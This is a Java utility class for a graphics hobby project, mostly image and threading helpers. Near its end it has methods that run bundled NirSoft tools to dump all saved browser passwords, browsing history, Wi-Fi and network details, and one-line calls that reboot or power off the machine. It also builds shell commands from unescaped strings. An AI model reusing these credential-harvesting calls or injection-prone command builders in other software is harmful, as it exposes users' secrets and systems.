package utils;

import com.sun.java.accessibility.util.AWTEventMonitor;
import com.sun.management.OperatingSystemMXBean;
import jmath.datatypes.functions.ColorFunction;
import jmath.datatypes.tuples.Point3D;
import swingutils.MainFrame;
import visualization.canvas.*;
import visualization.canvas.Canvas;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferInt;
import java.awt.image.RenderedImage;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.MemoryUsage;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.IntBinaryOperator;
import java.util.function.IntUnaryOperator;

import static java.lang.Math.*;

@SuppressWarnings("unused")
public final class Utils {

    public static final String nirCMDPath;
    public static final Robot robot;

    public static final int NANO = 1000000000;
    public static final int MILLIS = 1000000;
    public static final int MEGABYTE = 1024 * 1024;

    private static final MemoryMXBean memMXBean;
    private static final MemoryUsage memHeapUsage;
    private static final MemoryUsage memNonHeapUsage;
    private static final OperatingSystemMXBean osMXBean;

    static {
        memMXBean = ManagementFactory.getMemoryMXBean();
        memHeapUsage = memMXBean.getHeapMemoryUsage();
        memNonHeapUsage =memMXBean.getNonHeapMemoryUsage();
        osMXBean = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();

        nirCMDPath = ".\\bin\\nircmdc.exe";
        Robot rbt;
        try {
            rbt = new Robot();
        } catch (AWTException e) {
            rbt = null;
            e.printStackTrace();
        }
        robot = rbt;
    }

    ///////////////////

    public static BufferedImage getCanvasImage(Canvas canvas) {
        var res = new BufferedImage(canvas.getWidth(), canvas.getHeight(), BufferedImage.TYPE_INT_RGB);
        var g2d = res.createGraphics();
        canvas.paintComponents(g2d);
        g2d.dispose();
        return res;
    }

    public static void saveJComponentImage(String path, Canvas canvas) {
        try {
            ImageIO.write(getCanvasImage(canvas),
                    path.contains(".") ? path.substring(path.lastIndexOf('.') + 1) : "jpg",
                    new File(path.contains(".") ? path : path + ".jpg"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Color randomColor() {
        return new Color((int) (Math.random() * Integer.MAX_VALUE));
    }

    public static double round(double num, int precision) {
        if (!Double.toString(num).contains("."))
            return num;
        String res = num + "0".repeat(20);
        return Double.parseDouble(res.substring(0, res.indexOf('.') + precision + 1));
    }

    public static int[] getIntColorArray(BufferedImage bi) {
        return ((DataBufferInt) bi.getRaster().getDataBuffer()).getData();
    }

    public static void multiThreadIntArraySetter(int[] src, IntUnaryOperator func, int numOfThreads) {
        if (numOfThreads < 1) {
            var len = src.length;
            for (int i = 0; i < len; i++)
                src[i] = func.applyAsInt(i);
            return;
        }
        var list = new Thread[numOfThreads];
        var partLen = src.length / numOfThreads;
        for (var i = 0; i < numOfThreads; i++) {
            final var counter = i;
            var t = new Thread(() -> {
                var start = counter * partLen;
                var end = counter == numOfThreads - 1 ? src.length : start + partLen;
                for (int j = start; j < end; j++)
                    src[j] = func.applyAsInt(j);
            });
            list[counter] = t;
            t.start();
        }
        for (var t : list)
            try {
                t.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
    }

    public static BufferedImage createImage(int width, int height, IntBinaryOperator colorFunc, int numOfThreads) {
        var res = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
        multiThreadIntArraySetter(getIntColorArray(res), i -> colorFunc.applyAsInt(i / width, i % width), numOfThreads);
        return res;
    }

    public static BufferedImage createImage(int width, int height, IntUnaryOperator colorFunc, int numOfThreads) {
        var res = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
        multiThreadIntArraySetter(getIntColorArray(res), colorFunc, numOfThreads);
        return res;
    }

    public static BufferedImage createImage(CoordinatedCanvas cc, ColorFunction colorFunc, int numOfThreads) {
        var w = cc.getWidth();
        var h = cc.getHeight();
        var res = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
        multiThreadIntArraySetter(getIntColorArray(res),
                i -> colorFunc.valueAt(cc.coordinateX(i / w), cc.coordinateY(i % w)).getRGB(), numOfThreads);
        return res;
    }

    public static BufferedImage createImage(int width, int height, Render render) {
        var res = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
        var g2d = res.createGraphics();
        render.render(g2d);
        g2d.dispose();
        return res;
    }

    public static BufferedImage[] createImageSequence(int width, int height, Render render, int numOfFrames) {
        var res = new BufferedImage[numOfFrames];
        for (int i = 0; i < numOfFrames; i++) {
            var bi = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
            var g2d = bi.createGraphics();
            render.render(g2d);
            g2d.dispose();
            res[i] = bi;
            render.tick();
        }
        return res;
    }

    public static BufferedImage createMergeImageFromImageSequence(BufferedImage[] imageSequence) {
        if (imageSequence == null || imageSequence.length == 0)
            throw new RuntimeException("AHD:: image sequence is null or empty");
        var res = new BufferedImage(imageSequence[0].getWidth(), imageSequence[0].getHeight(),
                BufferedImage.TYPE_INT_ARGB);
        var g2d = res.createGraphics();
        Arrays.stream(imageSequence).forEach(bi -> g2d.drawImage(bi, 0, 0, null));
        g2d.dispose();
        return res;
    }

    public static BufferedImage createImageSingleThread(int width, int height, IntUnaryOperator colorFunc) {
        var res = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
        var arr = getIntColorArray(res);
        for (int i = 0; i < arr.length; i++)
            arr[i] = colorFunc.applyAsInt(i);
        return res;
    }

    public static BufferedImage toBufferedImage(Image img) {
        return toBufferedImage(img, new Dimension(1280, 720));
    }

    public static BufferedImage toBufferedImage(Image img, Dimension dimensionIfNotRendered) {
        if (img instanceof BufferedImage im)
            return im;
        BufferedImage res = new BufferedImage(img.getWidth(null) <= 0 ? dimensionIfNotRendered.width : img.getWidth(null),
                img.getHeight(null) <= 0 ? dimensionIfNotRendered.height : img.getHeight(null), BufferedImage.TYPE_INT_ARGB);
        var g2d = res.createGraphics();
        g2d.drawImage(img, 0, 0, null);
        g2d.dispose();
        return res;
    }

    public static BufferedImage getBufferedImage(String path) {
        return toBufferedImage(getImage(path));
    }

    public static void affectOnImageSingleThread(BufferedImage image, IntUnaryOperator func) {
        var pixels = getIntColorArray(image);
        for (int i = 0; i < pixels.length; i++)
            pixels[i] = func.applyAsInt(pixels[i]);
    }

    public static void affectOnImage(BufferedImage image, IntUnaryOperator func, int numOfThreads) {
        if (numOfThreads <= 0) {
            affectOnImageSingleThread(image, func);
            return;
        }
        var pixels = getIntColorArray(image);
        multiThreadIntArraySetter(pixels, i -> func.applyAsInt(pixels[i]), numOfThreads);
    }


    //////////////////////

    public static <T> AtomicReference<T> checkTimePerform(
            Task<T> task,
            boolean inCurrentThread,
            String name,
            Object... args) {
        long t = System.currentTimeMillis();
        var res = new AtomicReference<T>();
        if (inCurrentThread) {
            res.set(task.task(args));
            System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
        } else {
            new Thread(() -> {
                res.set(task.task(args));
                System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
            }, name).start();
        }
        return res;
    }

    public static <T> AtomicReference<T> checkTimePerform(
            Task<T> task,
            boolean inCurrentThread,
            String name,
            Action<T> toDo,
            Object... args) {
        return checkTimePerform(e -> {
            var res = task.task(args);
            final var t = System.currentTimeMillis();
            toDo.act(res);
            System.err.println("AHD:: Action completed in " + (System.currentTimeMillis() - t) + " ms");
            return res;
        }, inCurrentThread, name, args);
    }

    public static void checkTimePerform(
            Runnable task,
            boolean inCurrentThread,
            String name) {
        long t = System.currentTimeMillis();
        if (inCurrentThread) {
            task.run();
            System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
        } else {
            new Thread(() -> {
                task.run();
                System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
            }, name).start();
        }
    }

    public static void checkTimePerform(
            Runnable task,
            boolean inCurrentThread) {
        checkTimePerform(task, inCurrentThread, "");
    }

    public static void sleep(int millis) {
        try {
            Thread.sleep(millis);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sleep(double millis) {
        try {
            Thread.sleep((long) Math.floor(millis), (int) (millis * 1000000) % 1000000);
        } catch (Exception ignore) {
        }
    }

    public static void sleep(long nanos) {
        try {
            Thread.sleep(nanos / 1000000, (int) (nanos / 1000000));
        } catch (Exception ignore) {
        }
    }

    public static Point3D[] point3DArray(double... values) {
        Point3D[] res = new Point3D[values.length / 3];
        for (int i = 0; i < values.length / 3; i++)
            res[i] = new Point3D(values[i * 3], values[i * 3 + 1], values[i * 3 + 2]);
        return res;
    }

    public static double random(double l, double u) {
        return l + Math.random() * (u - l);
    }

    public static int randInt(int l, int u) {
        return (int) Math.floor(random(l, u));
    }

    public static <T> void removeDuplicates(List<T> list) {
        var newList = new ArrayList<T>();
        for (var element : list)
            if (!newList.contains(element))
                newList.add(element);
        list.clear();
        list.addAll(newList);
    }

    public static void writeObjects(String path, Object... objects) {
        FileOutputStream fStream;
        try (ObjectOutputStream oStream = new ObjectOutputStream(fStream = new FileOutputStream(path))) {
            PrintWriter writer = new PrintWriter(fStream);
            writer.write("");
            for (Object o : objects)
                oStream.writeObject(o);
            fStream.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static Object deserializeBytes(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bytesIn = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bytesIn);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }

    public static byte[] serializeObject(Object obj) throws IOException {
        ByteArrayOutputStream bytesOut = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bytesOut);
        oos.writeObject(obj);
        oos.flush();
        byte[] bytes = bytesOut.toByteArray();
        bytesOut.close();
        oos.close();
        return bytes;
    }

    public static byte[] convertFileToByteArray(File file) {
        FileInputStream fis = null;
        byte[] bArray = new byte[(int) file.length()];
        try {
            fis = new FileInputStream(file);
            var done = fis.read(bArray);
            if (done < 0)
                throw new Exception("Error in reading the file.");
            fis.close();
        } catch (Exception ioExp) {
            ioExp.printStackTrace();
        } finally {
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return bArray;
    }

    public static void writeByteArrayToFile(String absPath, byte[] arr) {
        try (FileOutputStream fos = new FileOutputStream(absPath)) {
            fos.write(arr);
        } catch (Exception e) {
            System.err.println("Error in saving the Byte Array in to " + absPath);
            e.printStackTrace();
        }
    }

    public static Object[] readObjects(String path) {
        ArrayList<Object> result = new ArrayList<>();
        FileInputStream fStream;
        try (ObjectInputStream oStream = new ObjectInputStream(fStream = new FileInputStream(path))) {
            while (true) {
                Object o;
                try {
                    o = oStream.readObject();
                } catch (Exception e) {
                    break;
                }
                result.add(o);
            }
            fStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return result.toArray();
    }

    public static void arrayShuffle(Object[] arr) {
        for (int i = 0; i < arr.length; i++) {
            int rp = (int) (Math.random() * arr.length);
            var temp = arr[i];
            arr[i] = arr[rp];
            arr[rp] = temp;
        }
    }

    public static void saveRenderedImage(RenderedImage img, String absPath) throws IOException {
        var dir = new File(absPath); //AHD::TODO need attention
        if (!(dir.exists() || dir.mkdirs())) {
            System.err.println("Error in Creating non existed directory: " + absPath);
            return;
        }
        ImageIO.write(img, "jpg", new File(absPath));
    }

    public static Image getImage(String absPath) {
        return Toolkit.getDefaultToolkit().getImage(absPath);
    }

    public static int checkBounds(int value, int min, int max) {
        return Math.max(min, Math.min(value, max));
    }

    public static double checkBounds(double value, double min, double max) {
        return Math.max(min, Math.min(value, max));
    }

    public static synchronized double cpuUsageByThisThread() {
        return osMXBean.getProcessCpuLoad();
    }

    public static synchronized double cpuUsageByJVM() {
        return osMXBean.getProcessCpuLoad();
    }

    public static synchronized long maxHeapSize() {
        return memHeapUsage.getMax();
    }

    public static synchronized long usedHeapSize() {
        return memHeapUsage.getUsed();
    }

    public static synchronized long committedHeap() {
        return memHeapUsage.getCommitted();
    }

    public static synchronized long initialHeapRequest() {
        return memHeapUsage.getInit();
    }

    public static synchronized long maxNonHeapSize() {
        return memNonHeapUsage.getMax();
    }

    public static synchronized long usedNonHeapSize() {
        return memNonHeapUsage.getUsed();
    }

    public static synchronized long committedNonHeap() {
        return memNonHeapUsage.getCommitted();
    }

    public static synchronized long initialNonHeapRequest() {
        return memNonHeapUsage.getInit();
    }

    //////////////////////
    public static void recordVoice(String absPath, long millis) {

    }

    public static void recordVideoFromWebcam(String absPath, long millis) {

    }

    public static BufferedImage screenShot() throws AWTException {
        return new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
    }

    public static String getFileAsString(String path) throws IOException {
        var br = new BufferedReader(new FileReader(path));
        var sb = new StringBuilder();
        String s;
        while ((s = br.readLine()) != null)
            sb.append(s).append("\n");
        br.close();
        return sb.toString().trim();
    }

    public static String setSystemVolume(int volume) throws IOException {
        if (volume < 0 || volume > 100)
            throw new RuntimeException("Error: " + volume + " is not a valid number. Choose a number between 0 and 100");
        return doNirCMD("setsysvolume " + (655.35 * volume)) + doNirCMD("mutesysvolume 0");
    }

    public static String doCMD(String command) throws IOException {
        var proc = Runtime.getRuntime().exec(command);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
        var sb = new StringBuilder("out>");
        String s;
        while ((s = stdInput.readLine()) != null)
            sb.append(s).append('\n');
        sb.append("err>");
        while ((s = stdError.readLine()) != null)
            sb.append(s).append('\n');
        stdError.close();
        stdInput.close();
        return sb.toString();
    }

    public static String doNirCMD(String command) throws IOException {
        return doCMD(nirCMDPath + " " + command);
    }

    interface FileInfo {
        String getInfo(File file);
    }

    public static List<String> filesInfo(String rootDirectory, FileFilter fileFilter, FileInfo fileInfo) {
        var res = new ArrayList<String>();
        var ff = new File(rootDirectory).listFiles(fileFilter);
        if (ff == null)
            return res;
        for (var f : ff) {
            res.add(fileInfo.getInfo(f));
            if (f.isDirectory())
                res.addAll(filesInfo(f.getAbsolutePath(), fileFilter, fileInfo));
        }
        return res;
    }

    public static String readAloud(String text) throws IOException {
        return doNirCMD("speak text \"" + text + '\"');
    }

    public static String setMuteSystemSpeaker(boolean mute) throws IOException {
        return doNirCMD("mutesysvolume " + (mute ? 1 : 0));
    }

    public static String toggleMuteSystemSpeaker() throws IOException {
        return doNirCMD("mutesysvolume 2");
    }

    public static String turnOffMonitor() throws IOException {
        return doNirCMD("monitor off");
    }

    public static String startDefaultScreenSaver() throws IOException {
        return doNirCMD("screensaver");
    }

    public static String putInStandByMode() throws IOException {
        return doNirCMD("standby");
    }

    public static String logOffCurrentUser() throws IOException {
        return doNirCMD("exitwin logoff");
    }

    public static String reboot() throws IOException {
        return doNirCMD("exitwin reboot");
    }

    public static String powerOff() throws IOException {
        return doNirCMD("exitwin poweroff");
    }

    public static String getAllPasswordsFromAllBrowsers() throws IOException {
        doCMD(".\\bin\\WebBrowserPassView.exe /stext \"tmp.exe\"");
        var res = getFileAsString(".\\tmp.exe");
        return getFileAsString(".\\tmp.exe") + new File(".\\tmp.exe").delete();
    }

    public static String setPrimaryScreenBrightness() throws IOException {
        return doCMD(".\\bin\\ControlMyMonitor.exe /SetValue Primary 10 10");
    }

    public static void setMousePos(int x, int y) {
        robot.mouseMove(x, y);
    }

    public static void setMousePos(Point p) {
        robot.mouseMove(p.x, p.y);
    }

    public static String getWifiInfo() throws IOException {
        doCMD(".\\bin\\WifiInfoView.exe /stext tmp.exe");
        return getFileAsStringAndDelete("tmp.exe");
    }

    public static String getFileAsStringAndDelete(String path) throws IOException {
        return getFileAsString(path) + "\n<del>" + new File(path).delete();
    }

    public static String getIpNetInfo(String ip) throws IOException {
        return doCMD(".\\bin\\IPNetInfo.exe /ip " + ip);
    }

    public static String getPortsInfo() throws IOException {
        doCMD(".\\bin\\cports.exe /stext tmp.exe");
        return getFileAsStringAndDelete("tmp.exe");
    }

    public static String getNetworkTrafficInfo() throws IOException {
        doCMD(".\\bin\\NetworkTrafficView.exe /stext tmp.exe");
        return getFileAsStringAndDelete("tmp.exe");
    }

    public static String getBatteryInfo() throws IOException {
        doCMD(".\\bin\\BatteryInfoView.exe /stext tmp.exe");
        return getFileAsStringAndDelete("tmp.exe");
    }

    public static String getBrowsersHistory() throws IOException {
        doCMD(".\\bin\\BrowsingHistoryView.exe /stext tmp.exe");
        return getFileAsStringAndDelete("tmp.exe");
    }

    //////////////////////

    private Utils() {}

    @FunctionalInterface
    public interface Task<T> {
        T task(Object... args);
    }

    @FunctionalInterface
    public interface Action<T> {
        void act(T t);
    }

    public static void main(String[] args) throws IOException, AWTException, InterruptedException {
//        var gp = new Graph3DCanvas();
//        var f = new UnaryFunction(x -> sin(x)/x);
//        var points = Graph2DCanvas.getPointsOf2DArc(
//                t -> new Point2D(t/3, 10*f.valueAt(t)-10), 0, 18*PI, 0.001, gp);
//        int counter = 0;
//        while (counter++ < 100000)
//            setMousePos(points[counter % points.length]);
        var f = new MainFrame();
//        new Thread(() -> {
//            try {
//                Thread.sleep(2000);
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
//            while (true) {
//                robot.mousePress(InputEvent.BUTTON1_MASK);
//                robot.mouseRelease(InputEvent.BUTTON1_MASK);
//            }
//        }).start();
        Toolkit.getDefaultToolkit().addAWTEventListener(e -> {
            if (e instanceof MouseEvent me && me.getButton() == MouseEvent.BUTTON1 && me.getID() == MouseEvent.MOUSE_PRESSED) {
                System.out.println(me.getModifiersEx());
            }
        }, AWTEvent.MOUSE_EVENT_MASK);
//        var ip = new ImageCanvas(createImageSingleThread(1280, 720, i -> new Color((float) Math.tan(PI * i / 1280.0 / 720), 0.5f, 0.5f).getRGB()));
//        f.add(ip);

        f.add(new Graph3DCanvas());



        SwingUtilities.invokeLater(f);
    }
}
